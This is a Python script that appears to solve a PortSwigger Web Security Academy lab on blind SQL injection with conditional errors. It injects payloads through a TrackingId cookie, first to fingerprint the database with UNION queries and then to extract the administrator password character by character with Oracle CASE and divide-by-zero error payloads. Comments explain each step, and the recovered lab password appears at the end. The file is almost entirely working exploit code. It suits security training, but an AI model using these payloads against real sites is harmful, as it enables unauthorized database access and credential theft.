
import requests as r
from time import sleep
import string

# start blind

#Lab name: Blind SQL injection with conditional errors

# lab description : 
# table name : Users
# column name : username, password
# goal find administrator password

link = "https://0ab1007504d48564c08c02a8004b00b2.web-security-academy.net" # without the last backslash



cookie_name="TrackingId"


# using # for commentin cause error so the used db may not be  MySQL
# let's find which of these db is it used : oracle , microsoft or postgresql 

# since the vulnerability is located in the cookie TrackingId
# the query may look like : select .... from ... where TrackingId='cookie' 


# first thing find the database : is it a oracle, postgresql , MsSql , ...
# after some enumeration i find out the database it's an oracle db


def find_db(cookie_user):
     # postgresql
     # microsoft or MySQL
     # oracle
    payload= ["\'  union (select version() )  --",  "\'  union (select @@version )  --", "\'  union (select banner from v$version )  --"] 


    for i in range(len(payload)):
        final_payload = cookie_user + payload[i]
        print(final_payload)

        myrequest = r.get(link, cookies={cookie_name:final_payload})
        response = myrequest.text


        if i==0:
            if "Server Error" in  response:
                print("NOT postgresql db")
            
            else:
                print("POSTGRESQL")


        if i==1:
            if "Server Error" in  response:
                print("NOT  microsoft or MySQL db")
            
            else:
                print(" microsoft or MySQL")


        if i==2:
            if "Server Error" in  response:
                print("NOT ORACLE db")
                
            
            else:
                print("ORACLE")
                


#find_db("F14xpnKoF83nOKRO")  # print ORACLE

# now we find the database behind the application , let's try to play with errors since the challenge is a blindSQLi

# after some test we found that the application won't failed if there isn't any syntax error 

# ex :
#  union  (select password from users where username='jeyanthan') --    => don't failed 
#  union  (select password from users where username='jeyanthan'' ) --  => failed


# let's abuse of oracle conditional error: 
# https://portswigger.net/web-security/sql-injection/cheat-sheet

# we will use concatenation instead of union because we are not going to retrieve directly information but 
# only use error  
def iter_password(cookie_user):

    # oracle 
    #  
    alpha_num = string.ascii_lowercase + string.ascii_uppercase + string.digits
    actual_carac=1
    test_carac=0
    password=""
    while test_carac < len(alpha_num):
        test_carac+=1
        for i in alpha_num:
            payload = cookie_user + "\'  ||  (select case when (substr(password,1,"+  str(actual_carac) + ")=\'"   + password+i + "\') then null else to_char(1/0) end from users where username=\'administrator\') || '"
            
            print(payload)
            
            myrequest = r.get(link, cookies={cookie_name:payload})

            response = myrequest.text
            
            if "Server Error" in  response:
                test_carac+=1
            
            else:
                password+=i
                actual_carac+=1
                test_carac=0

            sleep(0.2)

    print("password :", password)

iter_password("F14xpnKoF83nOKRO") 

# after a few second the password pop
# 02mmp29wh8mq3vexspgn
